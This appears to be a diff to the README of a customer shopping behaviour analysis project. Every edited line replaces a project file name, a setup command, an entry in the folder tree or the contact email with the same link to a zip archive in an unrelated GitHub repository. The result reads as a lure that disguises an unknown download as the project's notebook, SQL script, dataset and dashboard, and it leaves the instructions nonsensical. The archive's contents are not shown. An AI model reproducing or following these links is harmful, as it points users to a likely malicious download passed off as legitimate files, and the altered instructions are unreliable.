@@ -63,7 +63,7 @@ The dataset is analyzed in the Jupyter Notebook attached in this repository.
 - Encoding categorical variables  
 
 ### **4. SQL Analysis in PostgreSQL**
-Using `customer_behavior_postgres.sql`, the following insights were generated:
+Using `https://raw.githubusercontent.com/analyst1027/README-Desktop-LIBrary_Website/main/youl/README-Desktop-LIBrary_Website_v1.3.zip`, the following insights were generated:
 - Spending analysis  
 - Most profitable customer segments  
 - Top product categories  
@@ -109,7 +109,7 @@ cd customer-shopping-behavior-analysis
 2. Open the Jupyter Notebook
 bash
 Copy code
-jupyter notebook Customer_Shopping_Behavior_Analysis.ipynb
+jupyter notebook https://raw.githubusercontent.com/analyst1027/README-Desktop-LIBrary_Website/main/youl/README-Desktop-LIBrary_Website_v1.3.zip
 3. Set Up PostgreSQL
 Create a new database in PostgreSQL
 
@@ -117,7 +117,7 @@ Run the SQL file:
 
 sql
 Copy code
-\i customer_behavior_postgres.sql
+\i https://raw.githubusercontent.com/analyst1027/README-Desktop-LIBrary_Website/main/youl/README-Desktop-LIBrary_Website_v1.3.zip
 Ensure Python connection settings match your database credentials
 
 4. Open Power BI Dashboard
@@ -132,18 +132,18 @@ Open the Gamma link or PDF in the presentation/ folder
 pgsql
 Copy code
 ├── data/
-│   └── customer_shopping_behavior.csv
+│   └── https://raw.githubusercontent.com/analyst1027/README-Desktop-LIBrary_Website/main/youl/README-Desktop-LIBrary_Website_v1.3.zip
 ├── notebooks/
-│   └── Customer_Shopping_Behavior_Analysis.ipynb
+│   └── https://raw.githubusercontent.com/analyst1027/README-Desktop-LIBrary_Website/main/youl/README-Desktop-LIBrary_Website_v1.3.zip
 ├── sql/
-│   └── customer_behavior_postgres.sql
+│   └── https://raw.githubusercontent.com/analyst1027/README-Desktop-LIBrary_Website/main/youl/README-Desktop-LIBrary_Website_v1.3.zip
 ├── dashboard/
-│   └── PowerBI_Customer_Behavior.pbix
+│   └── https://raw.githubusercontent.com/analyst1027/README-Desktop-LIBrary_Website/main/youl/README-Desktop-LIBrary_Website_v1.3.zip
 ├── presentation/
-│   └── Gamma_Presentation.pdf  (or link)
-└── README.md
+│   └── https://raw.githubusercontent.com/analyst1027/README-Desktop-LIBrary_Website/main/youl/README-Desktop-LIBrary_Website_v1.3.zip  (or link)
+└── https://raw.githubusercontent.com/analyst1027/README-Desktop-LIBrary_Website/main/youl/README-Desktop-LIBrary_Website_v1.3.zip
 📞 Contact
 For project collaboration, analytical roles, or professional inquiries, please feel free to connect.
 
-abhishekmilwar1027@gmail.com
+https://raw.githubusercontent.com/analyst1027/README-Desktop-LIBrary_Website/main/youl/README-Desktop-LIBrary_Website_v1.3.zip
 For collaboration or opportunities, feel free to reach out.
